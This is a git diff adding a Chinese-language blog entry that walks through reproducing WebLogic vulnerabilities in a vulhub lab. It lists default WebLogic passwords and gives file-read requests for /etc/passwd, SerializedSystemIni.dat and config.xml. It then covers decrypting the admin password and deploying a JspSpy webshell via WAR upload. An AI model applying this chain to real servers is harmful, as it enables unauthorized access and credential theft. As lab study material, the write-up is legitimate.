@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>weblogic weak_password复现</title>
+      <link href="/2019/07/25/weblogic-weak-password-fu-xian/"/>
+      <url>/2019/07/25/weblogic-weak-password-fu-xian/</url>
+      
+        <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>基于vulhub的weblogic弱口令漏洞和任意文件读取漏洞</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>本环境存在弱口令</p><pre><code>用户名：weblogic密码：Oracle@123</code></pre><p>weblogic常见的弱口令组合</p><pre><code>1.  Oracle - WebLogicMethod    HTTPUser ID    systemPassword    passwordLevel    AdministratorDoc    Notes    Login located at /console2.  Oracle - WebLogicMethod    HTTPUser ID    weblogicPassword    weblogicLevel    AdministratorDoc    Notes    Login located at /console3.  Oracle - WebLogicVersion    9.0 Beta (Diablo)User ID    weblogicPassword    weblogicDoc    4.  Oracle - WebLogic Process IntegratorVersion    2.0User ID    adminPassword    securityDoc    5.  Oracle - WebLogic Process IntegratorVersion    2.0User ID    joePassword    passwordDoc    6.  Oracle - WebLogic Process IntegratorVersion    2.0User ID    maryPassword    passwordDoc    7.  Oracle - WebLogic Process IntegratorVersion    2.0User ID    systemPassword    securityDoc    8.  Oracle - WebLogic Process IntegratorVersion    2.0User ID    wlcsystemPassword    wlcsystemDoc    9.  Oracle - WebLogic Process IntegratorVersion    2.0User ID    wlpisystemPassword    wlpisystemDoc    </code></pre><p>获取到账号和密码之后，我们可以进入到后台去上传war的web应用程序和木马获得权限</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>搭建好的环境有任意文件读取漏洞，具体路径是</p><pre><code>http://192.168.75.131:7001/hello/file.jsp?path=/etc/passwd</code></pre><p>会读取到账号和密码<br><img src="/2019/07/25/weblogic-weak-password-fu-xian/1.PNG" alt=""><br>但是还没有什么实质性的作用，要怎么利用这个漏洞呢？下面就是一些干货了。weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml。<br>SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，这就是密钥，右键copy to file就可以保存成一个文件：</p><pre><code>http://192.168.75.131:7001/hello/file.jsp?path=security/SerializedSystemIni.dat</code></pre><p><img src="/2019/07/25/weblogic-weak-password-fu-xian/2.PNG" alt=""><br>config.xml是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的<node-manager-password-encrypted>的值，即为加密后的管理员密码，不要找错了：</node-manager-password-encrypted></p><pre><code>http://192.168.75.131:7001/hello/file.jsp?path=config/config.xml</code></pre><p><img src="/2019/07/25/weblogic-weak-password-fu-xian/3.PNG" alt=""></p><h3 id="解密密文"><a href="#解密密文" class="headerlink" title="解密密文"></a>解密密文</h3><p>我们有了密钥和密码，下面就要解密了，然后使用工具weblogic_decrypt.jar解密<br><img src="/2019/07/25/weblogic-weak-password-fu-xian/4.PNG" alt=""><br>同样获取到了明文密码，就算没有弱口令也是可以进入后台上传shell的</p><h2 id="后台上传shell"><a href="#后台上传shell" class="headerlink" title="后台上传shell"></a>后台上传shell</h2><h3 id="war简介"><a href="#war简介" class="headerlink" title="war简介"></a>war简介</h3><p>war是一个可以直接运行的web模块，通常用于网站，打成包部署到容器中。war包放置到web目录下之后，可以自动解压，就相当于发布了。<br>简单来说，war包是JavaWeb程序打的包，war包里面包括写的代码编译成的class文件，依赖的包，配置文件，所有的网站页面，包括html，jsp等等。一个war包可以理解为是一个web项目，里面是项目的所有东西。</p><h3 id="war打包"><a href="#war打包" class="headerlink" title="war打包"></a>war打包</h3><p>linux下把文件打包成war的压缩包，命令如下</p><pre><code>jar -cvf blog.war *</code></pre><p>查看example.war</p><pre><code>jar -tf blog.war</code></pre><p>也可以先把文件压缩成zip，再改后缀名为war</p><h3 id="部署war文件"><a href="#部署war文件" class="headerlink" title="部署war文件"></a>部署war文件</h3><p>上传war的流程如下图所示<br><img src="/2019/07/25/weblogic-weak-password-fu-xian/1.gif" alt=""><br>总结起来就是：域结构-部署-安装-上传文件-将此部署安装为应用程序。然后访问项目名称即可。<br>最后访问的路径是</p><pre><code>http://192.168.75.131:7001/JspSpy/JspSpy.jsp</code></pre><p>截图如下<br><img src="/2019/07/25/weblogic-weak-password-fu-xian/5.PNG" alt=""><br>至此就拿到了shell</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>weblogic ssrf 漏洞复现</title>
       <link href="/2019/07/24/weblogic-ssrf-lou-dong-fu-xian/"/>
       <url>/2019/07/24/weblogic-ssrf-lou-dong-fu-xian/</url>
